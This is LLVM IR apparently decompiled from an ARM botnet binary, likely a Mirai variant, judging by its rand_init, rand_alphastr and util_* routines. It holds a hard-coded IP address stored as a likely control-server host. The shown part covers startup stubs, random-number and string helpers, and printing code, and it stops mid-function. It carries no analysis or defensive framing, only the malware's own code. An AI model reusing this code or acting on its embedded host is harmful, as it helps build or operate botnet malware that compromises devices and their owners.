source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_2228c.19 = global i32 0
@global_var_9dd0.23 = constant i32 -509558771
@global_var_2258c.26 = global i32 0
@global_var_22590.28 = global i32 0
@global_var_22594.30 = local_unnamed_addr global i32 0
@global_var_22598.32 = global i32 0
@global_var_18a18.38 = constant [30 x i8] c"fjh249f20348rh13rf8j13ru310rt\00"
@global_var_18a38.41 = constant [7 x i8] c"(null)\00"
@global_var_22354 = external local_unnamed_addr global i32
@global_var_22588.46 = global i32 0
@global_var_22580.48 = global i32 0
@global_var_22584.49 = local_unnamed_addr global i32 0
@global_var_25264.51 = global i32 0
@global_var_18a40.53 = constant [6 x i32] %wide-string
@global_var_18a44.55 = constant [5 x i32] %wide-string
@global_var_18a48.57 = constant [4 x i32] %wide-string
@global_var_2234c.62 = local_unnamed_addr global i32 -1
@global_var_18a08.64 = constant [14 x i8] c"66.172.10.124\00"
@global_var_22348.65 = global [14 x i8]* @global_var_18a08.64
@global_var_18a4c.68 = constant [3 x i32] %wide-string
@global_var_18a50.72 = constant i32 32
@global_var_22290.79 = global i32 0
@global_var_17a44.81 = constant i32 436207628
@global_var_17864.89 = constant i32 436207625
@global_var_1769c.98 = constant i32 -513933302
@global_var_ad4c.100 = constant i32 -456978431
@global_var_222ac.107 = local_unnamed_addr global i32 12
@global_var_170c8.123 = constant i32 -516620276
@global_var_b4f8.136 = constant i32 -478871519
@global_var_be84.147 = constant i32 -382906384
@global_var_a92c.157 = constant i32 -442544040
@global_var_c42c.164 = constant i32 -442564540
@global_var_ce28.221 = constant i32 -369098502
@global_var_d7fc.235 = constant i32 -382910288
@global_var_255f0.254 = local_unnamed_addr global i32 0
@global_var_1450c.257 = constant i32 -514850806
@global_var_c2b4.266 = constant i32 -442543860
@global_var_acc0.275 = constant i32 -369093166
@global_var_13cbc.303 = constant i32 -382910336
@global_var_e878.317 = constant i32 -443088884
@global_var_13a38.319 = constant i32 60320
@global_var_c038.332 = constant i32 -382909968
@global_var_fe98.336 = constant i32 -382906384
@global_var_12e38.348 = constant i32 -442695632
@global_var_12b68.355 = constant i32 -509607926
@global_var_f958.366 = constant i32 -382910448
@global_var_11df4.367 = constant i32 -382909968
@global_var_11158.408 = constant i32 -478805983
@global_var_11ba8.439 = constant i32 -382910352
@global_var_fee8.455 = constant i32 -514654200
@global_var_dbe0.473 = constant i32 -450904024
@global_var_1304c.480 = constant i32 -442695584
@global_var_13628.490 = constant i32 -382910224
@global_var_eb9c.512 = constant [3 x i8] c",\0C\00"
@global_var_13790.514 = constant i32 167772324
@global_var_e608.523 = constant i32 -382910336
@global_var_15740.527 = constant i32 -382910224
@global_var_cbfc.568 = constant i32 -442543972
@global_var_16cc8.587 = constant i32 -504313148
@global_var_16cb0.588 = constant i32 -483131392
@global_var_16b5c.589 = constant i32 -481229311
@global_var_16d38.590 = constant i32 -477817729
@global_var_16e38.591 = constant i32 -476034303
@global_var_17074.592 = constant i32 -516685812
@global_var_16f68.593 = constant i32 -905969571
@global_var_16e9c.594 = constant i32 -528203771
@global_var_170fc.595 = constant i32 -478079873
@global_var_170e0.596 = constant i32 -534704125
@global_var_17090.597 = constant i32 -534704125
@global_var_17028.598 = constant i32 -483131392
@global_var_17964.606 = constant i32 -481296376
@global_var_17a5c.607 = constant i32 -481296376
@global_var_17ae0.608 = constant i32 -369098732
@global_var_22560.9 = external global i8*
@global_var_222f0.75 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_8108 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_8108)
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_810c = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_810c)
  %v1_810c = load i32, i32* @r0, align 4
  ret i32 %v1_810c
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_8110 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_8110)
  %v1_8110 = load i32, i32* @r0, align 4
  ret i32 %v1_8110
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_8114 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_8114)
  %v1_8114 = load i32, i32* @r0, align 4
  ret i32 %v1_8114
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_8118 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_8118)
  %v1_8118 = load i32, i32* @r0, align 4
  ret i32 %v1_8118
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
  %v0_811c = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_811c)
  %v1_811c = load i32, i32* @r0, align 4
  ret i32 %v1_811c
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8120 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8120)
  %v1_8120 = load i32, i32* @r0, align 4
  ret i32 %v1_8120
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8124 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8124)
  %v1_8124 = load i32, i32* @r0, align 4
  ret i32 %v1_8124
}

define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8128 = load i32, i32* @r0, align 4
  ret i32 %v1_8128
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_812c = load i32, i32* @r4, align 4
  store i32 %v3_812c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_22560.9 to i32), i32* %r4.global-to-local, align 4
  %v2_8134 = load i8, i8* bitcast (i8** @global_var_22560.9 to i8*), align 4
  %v2_8138 = icmp eq i8 %v2_8134, 0
  br i1 %v2_8138, label %dec_label_pc_8140, label %dec_label_pc_815c

dec_label_pc_8140:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* %r4.global-to-local, align 4
  %v3_8158 = inttoptr i32 %v2_8158 to i8*
  store i8 1, i8* %v3_8158, align 1
  %v2_815c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_815c

dec_label_pc_815c:                                ; preds = %entry, %dec_label_pc_8140
  %v2_815c = phi i32 [ %v3_812c, %entry ], [ %v2_815c.pre, %dec_label_pc_8140 ]
  store i32 %v2_815c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_22560.9, { 1, 0 }
  uselistorder label %dec_label_pc_815c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8194 = load i32, i32* @global_var_2228c.19, align 4
  %v2_8198 = icmp eq i32 %v2_8194, 0
  br i1 %v2_8198, label %dec_label_pc_81b0, label %dec_label_pc_81a0

dec_label_pc_81a0:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_81b0

dec_label_pc_81b0:                                ; preds = %bb, %dec_label_pc_81a0
  ret i32 ptrtoint (i32* @global_var_2228c.19 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2228c.19, { 1, 0 }
  uselistorder label %dec_label_pc_81b0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_81d8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81f8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_9dd0.23 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 100856, i32 %arg1, i32 %v4_81d8)
  %v0_81fc = call i32 @abort()
  ret i32 %v0_81fc
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8220 = call i32 @__GI_time(i32* null)
  store i32 %v2_8220, i32* @global_var_2258c.26, align 4
  %v0_8234 = call i32 @__getpid()
  store i32 %v0_8234, i32* @r0, align 4
  %v0_823c = call i32 @getppid()
  %v2_8244 = xor i32 %v0_8234, %v0_823c
  store i32 %v2_8244, i32* @global_var_22590.28, align 4
  %v0_8254 = call i32 @clock()
  store i32 %v0_8254, i32* @global_var_22594.30, align 4
  %v2_8274 = load i32, i32* @global_var_22590.28, align 4
  %v2_8278 = xor i32 %v2_8274, %v0_8254
  store i32 %v2_8278, i32* @global_var_22598.32, align 4
  ret i32 %v0_8254

; uselistorder directives
  uselistorder i32 %v0_8254, { 1, 0, 2 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_82b4 = load i32, i32* @global_var_2258c.26, align 4
  %v3_82c0 = mul i32 %v2_82b4, 2048
  %v2_82c8 = xor i32 %v3_82c0, %v2_82b4
  %v3_82d4 = udiv i32 %v2_82c8, 256
  %v2_82e8 = load i32, i32* @global_var_22590.28, align 4
  store i32 %v2_82e8, i32* @global_var_2258c.26, align 4
  %v2_82f8 = load i32, i32* @global_var_22594.30, align 4
  store i32 %v2_82f8, i32* @global_var_22590.28, align 4
  %v2_8308 = load i32, i32* @global_var_22598.32, align 4
  store i32 %v2_8308, i32* @global_var_22594.30, align 4
  %v3_831c = udiv i32 %v2_8308, 524288
  %v2_8328 = xor i32 %v3_82d4, %v2_82c8
  %v2_82dc = xor i32 %v2_8328, %v2_8308
  %v2_8340 = xor i32 %v2_82dc, %v3_831c
  store i32 %v2_8340, i32* @global_var_22598.32, align 4
  ret i32 %v2_8340

; uselistorder directives
  uselistorder i32 %v2_8308, { 1, 0, 2 }
  uselistorder i32 %v2_82c8, { 1, 0 }
  uselistorder i32 %v2_82b4, { 1, 0 }
  uselistorder i32* @global_var_22598.32, { 0, 2, 1 }
  uselistorder i32* @global_var_22594.30, { 0, 2, 1 }
  uselistorder i32* @global_var_22590.28, { 0, 2, 3, 1 }
  uselistorder i32* @global_var_2258c.26, { 0, 2, 1 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8384 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v5_843c3 = icmp sgt i32 %arg2, 0
  br i1 %v5_843c3, label %dec_label_pc_8390, label %dec_label_pc_8440

dec_label_pc_8390:                                ; preds = %entry, %dec_label_pc_8434.backedge
  %v3_83c8 = phi i32 [ %v3_8434.be, %dec_label_pc_8434.backedge ], [ %arg2, %entry ]
  %stack_var_-28.0.in4 = phi i32 [ %stack_var_-28.0.in.be, %dec_label_pc_8434.backedge ], [ %v0_8384, %entry ]
  %v7_8398 = icmp slt i32 %v3_83c8, 4
  br i1 %v7_8398, label %dec_label_pc_83c8, label %dec_label_pc_839c

dec_label_pc_839c:                                ; preds = %dec_label_pc_8390
  %v0_83a0 = call i32 @rand_next()
  store i32 %v0_83a0, i32* %r0.global-to-local, align 4
  %v2_83a8 = inttoptr i32 %stack_var_-28.0.in4 to i32*
  store i32 %v0_83a0, i32* %v2_83a8, align 4
  %v1_83b0 = add i32 %stack_var_-28.0.in4, 4
  %v3_83b8 = load i32, i32* %stack_var_-32, align 4
  %v1_83bc = add i32 %v3_83b8, -4
  store i32 %v1_83bc, i32* %stack_var_-32, align 4
  br label %dec_label_pc_8434.backedge

dec_label_pc_83c8:                                ; preds = %dec_label_pc_8390
  %v7_83d0 = icmp slt i32 %v3_83c8, 2
  br i1 %v7_83d0, label %dec_label_pc_8408, label %dec_label_pc_83d4

dec_label_pc_83d4:                                ; preds = %dec_label_pc_83c8
  %v0_83d8 = call i32 @rand_next()
  store i32 %v0_83d8, i32* %r0.global-to-local, align 4
  %v1_83e8 = trunc i32 %v0_83d8 to i16
  %v3_83e8 = inttoptr i32 %stack_var_-28.0.in4 to i16*
  store i16 %v1_83e8, i16* %v3_83e8, align 2
  %v1_83f0 = add i32 %stack_var_-28.0.in4, 2
  %v3_83f8 = load i32, i32* %stack_var_-32, align 4
  %v1_83fc = add i32 %v3_83f8, -2
  store i32 %v1_83fc, i32* %stack_var_-32, align 4
  br label %dec_label_pc_8434.backedge

dec_label_pc_8408:                                ; preds = %dec_label_pc_83c8
  %v0_8408 = call i32 @rand_next()
  store i32 %v0_8408, i32* %r0.global-to-local, align 4
  %v1_8418 = trunc i32 %v0_8408 to i8
  %v3_8418 = inttoptr i32 %stack_var_-28.0.in4 to i8*
  store i8 %v1_8418, i8* %v3_8418, align 1
  %v1_8420 = add i32 %stack_var_-28.0.in4, 1
  %v3_8428 = load i32, i32* %stack_var_-32, align 4
  %v1_842c = add i32 %v3_8428, -1
  store i32 %v1_842c, i32* %stack_var_-32, align 4
  br label %dec_label_pc_8434.backedge

dec_label_pc_8434.backedge:                       ; preds = %dec_label_pc_8408, %dec_label_pc_839c, %dec_label_pc_83d4
  %v3_8434.be = phi i32 [ %v1_83fc, %dec_label_pc_83d4 ], [ %v1_83bc, %dec_label_pc_839c ], [ %v1_842c, %dec_label_pc_8408 ]
  %stack_var_-28.0.in.be = phi i32 [ %v1_83f0, %dec_label_pc_83d4 ], [ %v1_83b0, %dec_label_pc_839c ], [ %v1_8420, %dec_label_pc_8408 ]
  %v5_843c = icmp sgt i32 %v3_8434.be, 0
  br i1 %v5_843c, label %dec_label_pc_8390, label %dec_label_pc_8434.dec_label_pc_8440_crit_edge

dec_label_pc_8434.dec_label_pc_8440_crit_edge:    ; preds = %dec_label_pc_8434.backedge
  %v1_8448.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_8434.dec_label_pc_8440_crit_edge, %entry
  %v1_8448 = phi i32 [ %v1_8448.pre, %dec_label_pc_8434.dec_label_pc_8440_crit_edge ], [ %v0_8384, %entry ]
  ret i32 %v1_8448

; uselistorder directives
  uselistorder i32 %v3_8434.be, { 1, 0 }
  uselistorder i32 %stack_var_-28.0.in4, { 4, 5, 3, 0, 2, 1 }
  uselistorder i32 %v0_8384, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder label %dec_label_pc_8434.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8390, { 1, 0 }
}

define i32 @rand_alphastr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-58 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_8450 = load i32, i32* @fp, align 4
  store i32 %v3_8450, i32* %stack_var_-16, align 4
  store i32 ptrtoint ([30 x i8]* @global_var_18a18.38 to i32), i32* @r3, align 4
  %v2_8468 = ptrtoint i32* %stack_var_-58 to i32
  store i32 30, i32* @ip, align 4
  store i32 %v2_8468, i32* @r0, align 4
  store i32 ptrtoint ([30 x i8]* @global_var_18a18.38 to i32), i32* @r1, align 4
  store i32 30, i32* @r2, align 4
  %v0_847c = call i32 @memcpy()
  store i32 %v0_847c, i32* %r0.global-to-local, align 4
  %v5_857c17 = icmp sgt i32 %arg2, 0
  br i1 %v5_857c17, label %dec_label_pc_8484.lr.ph, label %dec_label_pc_8580

dec_label_pc_8484.lr.ph:                          ; preds = %entry
  %v13_8450 = ptrtoint i32* %stack_var_-16 to i32
  %v2_84d4 = add i32 %v13_8450, -42
  br label %dec_label_pc_8484

dec_label_pc_8484:                                ; preds = %dec_label_pc_8484.lr.ph, %dec_label_pc_8574.backedge
  %stack_var_-72.019 = phi i32 [ %arg2, %dec_label_pc_8484.lr.ph ], [ %stack_var_-72.0.be, %dec_label_pc_8574.backedge ]
  %stack_var_-68.118 = phi i8* [ %arg1, %dec_label_pc_8484.lr.ph ], [ %stack_var_-68.1.be, %dec_label_pc_8574.backedge ]
  %tmp35 = icmp ult i32 %stack_var_-72.019, 4
  %v0_851c = call i32 @rand_next()
  store i32 %v0_851c, i32* %r0.global-to-local, align 4
  br i1 %tmp35, label %dec_label_pc_851c, label %dec_label_pc_84a8.lr.ph

dec_label_pc_84a8.lr.ph:                          ; preds = %dec_label_pc_8484
  %v5_8498 = trunc i32 %v0_851c to i8
  br label %dec_label_pc_84a8

dec_label_pc_84a8:                                ; preds = %dec_label_pc_84a8.lr.ph, %dec_label_pc_84a8
  %storemerge814 = phi i32 [ 0, %dec_label_pc_84a8.lr.ph ], [ %v1_84f8, %dec_label_pc_84a8 ]
  %stack_var_-24.013 = phi i8 [ %v5_8498, %dec_label_pc_84a8.lr.ph ], [ %v5_84b8, %dec_label_pc_84a8 ]
  %stack_var_-68.012 = phi i8* [ %stack_var_-68.118, %dec_label_pc_84a8.lr.ph ], [ %v5_84f0, %dec_label_pc_84a8 ]
  %v4_84a8 = sext i8 %stack_var_-24.013 to i32
  %v3_84b4 = udiv i32 %v4_84a8, 256
  %v5_84b8 = trunc i32 %v3_84b4 to i8
  %div = udiv i8 %stack_var_-24.013, 8
  %v3_84c0 = zext i8 %div to i32
  %v2_84d8 = add i32 %v2_84d4, %v3_84c0
  %v1_84dc = inttoptr i32 %v2_84d8 to i8*
  %v2_84dc = load i8, i8* %v1_84dc, align 1
  %v4_84e0 = ptrtoint i8* %stack_var_-68.012 to i32
  store i8 %v2_84dc, i8* %stack_var_-68.012, align 1
  %v1_84ec = add i32 %v4_84e0, 1
  %v5_84f0 = inttoptr i32 %v1_84ec to i8*
  %v1_84f8 = add i32 %storemerge814, 1
  %tmp36 = icmp ult i32 %v1_84f8, 4
  br i1 %tmp36, label %dec_label_pc_84a8, label %dec_label_pc_850c

dec_label_pc_850c:                                ; preds = %dec_label_pc_84a8
  %v1_8510 = add i32 %stack_var_-72.019, -4
  br label %dec_label_pc_8574.backedge

dec_label_pc_851c:                                ; preds = %dec_label_pc_8484
  %v1_8528 = zext i32 %v0_851c to i64
  %v4_8528 = mul nuw i64 %v1_8528, 2290649225
  %v3_852c2 = udiv i64 %v4_8528, 68719476736
  %v2_85384 = mul nuw nsw i64 %v3_852c2, 2
  %v2_8538 = trunc i64 %v2_85384 to i32
  %v3_853c6 = mul nuw nsw i64 %v3_852c2, 32
  %v3_853c = trunc i64 %v3_853c6 to i32
  %v2_854021 = sub i32 %v2_8538, %v3_853c
  %v2_8544 = add i32 %v2_854021, %v0_851c
  %v4_8554 = ptrtoint i8* %stack_var_-68.118 to i32
  %v1_8558 = trunc i32 %v2_8544 to i8
  store i8 %v1_8558, i8* %stack_var_-68.118, align 1
  %v1_8560 = add i32 %v4_8554, 1
  %v5_8564 = inttoptr i32 %v1_8560 to i8*
  %v1_856c = add i32 %stack_var_-72.019, -1
  br label %dec_label_pc_8574.backedge

dec_label_pc_8574.backedge:                       ; preds = %dec_label_pc_851c, %dec_label_pc_850c
  %stack_var_-68.1.be = phi i8* [ %v5_84f0, %dec_label_pc_850c ], [ %v5_8564, %dec_label_pc_851c ]
  %stack_var_-72.0.be = phi i32 [ %v1_8510, %dec_label_pc_850c ], [ %v1_856c, %dec_label_pc_851c ]
  %v5_857c = icmp sgt i32 %stack_var_-72.0.be, 0
  br i1 %v5_857c, label %dec_label_pc_8484, label %dec_label_pc_8574.dec_label_pc_8580_crit_edge

dec_label_pc_8574.dec_label_pc_8580_crit_edge:    ; preds = %dec_label_pc_8574.backedge
  %v1_8588.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8580

dec_label_pc_8580:                                ; preds = %dec_label_pc_8574.dec_label_pc_8580_crit_edge, %entry
  %v1_8588 = phi i32 [ %v1_8588.pre, %dec_label_pc_8574.dec_label_pc_8580_crit_edge ], [ %v0_847c, %entry ]
  %v2_8584 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8584, i32* @fp, align 4
  ret i32 %v1_8588

; uselistorder directives
  uselistorder i32 %v0_851c, { 0, 2, 1, 3 }
  uselistorder i32 %stack_var_-72.019, { 1, 2, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_84a8, { 1, 0 }
  uselistorder label %dec_label_pc_8484, { 1, 0 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_85c0

dec_label_pc_85b4:                                ; preds = %dec_label_pc_85c0
  %v4_85c0 = ptrtoint i8* %stack_var_-28.0 to i32
  %v1_85dc = add i32 %v4_85c0, 1
  %v5_85e0 = inttoptr i32 %v1_85dc to i8*
  %v1_85b8 = add i32 %storemerge2, 1
  br label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %entry, %dec_label_pc_85b4
  %stack_var_-28.0 = phi i8* [ %arg1, %entry ], [ %v5_85e0, %dec_label_pc_85b4 ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_85b8, %dec_label_pc_85b4 ]
  %v2_85c4 = load i8, i8* %stack_var_-28.0, align 1
  %v2_85c8 = icmp eq i8 %v2_85c4, 0
  br i1 %v2_85c8, label %dec_label_pc_85ec, label %dec_label_pc_85b4

dec_label_pc_85ec:                                ; preds = %dec_label_pc_85c0
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-28.0, { 1, 0 }
  uselistorder label %dec_label_pc_85c0, { 1, 0 }
}

define i32 @util_memcpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_86686 = icmp eq i32 %arg3, 0
  br i1 %v3_86686, label %dec_label_pc_8670, label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %entry, %dec_label_pc_8630
  %v1_865c13.in = phi i32 [ %v1_865c13, %dec_label_pc_8630 ], [ %arg3, %entry ]
  %storemerge.in12 = phi i32 [ %v1_8650, %dec_label_pc_8630 ], [ %arg2, %entry ]
  %stack_var_-24.011 = phi i8* [ %v5_8648, %dec_label_pc_8630 ], [ %arg1, %entry ]
  %v1_865c13 = add i32 %v1_865c13.in, -1
  %storemerge = inttoptr i32 %storemerge.in12 to i8*
  %v2_8634 = load i8, i8* %storemerge, align 1
  %v4_8638 = ptrtoint i8* %stack_var_-24.011 to i32
  store i8 %v2_8634, i8* %stack_var_-24.011, align 1
  %v1_8644 = add i32 %v4_8638, 1
  %v5_8648 = inttoptr i32 %v1_8644 to i8*
  %v1_8650 = add i32 %storemerge.in12, 1
  %v3_8668 = icmp eq i32 %v1_865c13, 0
  br i1 %v3_8668, label %dec_label_pc_8670, label %dec_label_pc_8630

dec_label_pc_8670:                                ; preds = %dec_label_pc_8630, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %storemerge.in12, { 1, 0 }
  uselistorder label %dec_label_pc_8630, { 1, 0 }
}

define i32 @util_strcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_8680 = load i32, i32* @fp, align 4
  %v1_8698 = inttoptr i32 %arg2 to i8*
  %v2_8698 = call i32 @util_strlen(i8* %v1_8698)
  %v1_86a8 = add i32 %v2_8698, 1
  %v3_86b8 = inttoptr i32 %arg1 to i8*
  %v4_86b8 = call i32 @util_memcpy(i8* %v3_86b8, i32 %arg2, i32 %v1_86a8)
  store i32 %v3_8680, i32* @fp, align 4
  ret i32 %v2_8698
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_86dc = ptrtoint i32* %stack_var_-24 to i32
  %v0_86e0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_86ec = icmp eq i32 %v0_86e0, 0
  br i1 %v2_86ec, label %dec_label_pc_8720, label %dec_label_pc_86f4

dec_label_pc_86f4:                                ; preds = %entry
  %v1_86f8 = inttoptr i32 %v0_86e0 to i32*
  %v2_86f8 = load i32, i32* %v1_86f8, align 4
  %v1_8704 = trunc i32 %arg2 to i8
  %v3_8704 = inttoptr i32 %v2_86f8 to i8*
  store i8 %v1_8704, i8* %v3_8704, align 1
  %v2_870c = load i32, i32* %v1_86f8, align 4
  %v1_8710 = add i32 %v2_870c, 1
  store i32 %v1_8710, i32* %v1_86f8, align 4
  %v1_873c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8734

dec_label_pc_8720:                                ; preds = %entry
  store i32 %v2_86dc, i32* @r3, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v2_8730 = call i32 @__GI___libc_write(i32 1, i32 %v2_86dc)
  store i32 %v2_8730, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8734

dec_label_pc_8734:                                ; preds = %dec_label_pc_86f4, %dec_label_pc_8720
  %v1_873c = phi i32 [ %v1_873c.pre, %dec_label_pc_86f4 ], [ %v2_8730, %dec_label_pc_8720 ]
  ret i32 %v1_873c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8734, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %v3_8744 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp43 = icmp slt i32 %arg3, 1
  br i1 %tmp43, label %dec_label_pc_87fc, label %dec_label_pc_877c

dec_label_pc_877c:                                ; preds = %entry
  %v2_87ac20 = load i8, i8* %arg2, align 1
  %v2_87b022 = icmp eq i8 %v2_87ac20, 0
  br i1 %v2_87b022, label %dec_label_pc_87b8, label %dec_label_pc_8790

dec_label_pc_8790:                                ; preds = %dec_label_pc_877c, %dec_label_pc_8790
  %v4_87a824 = phi i32 [ %v1_87a0, %dec_label_pc_8790 ], [ %tmp, %dec_label_pc_877c ]
  %stack_var_-40.023 = phi i32 [ %v1_8794, %dec_label_pc_8790 ], [ 0, %dec_label_pc_877c ]
  %v1_8794 = add i32 %stack_var_-40.023, 1
  %v1_87a0 = add i32 %v4_87a824, 1
  %v5_87a4 = inttoptr i32 %v1_87a0 to i8*
  %v2_87ac = load i8, i8* %v5_87a4, align 1
  %v2_87b0 = icmp eq i8 %v2_87ac, 0
  br i1 %v2_87b0, label %dec_label_pc_87b8, label %dec_label_pc_8790

dec_label_pc_87b8:                                ; preds = %dec_label_pc_8790, %dec_label_pc_877c
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_877c ], [ %v1_8794, %dec_label_pc_8790 ]
  %v5_87c4 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_87c4, label %dec_label_pc_87d4, label %dec_label_pc_87e4

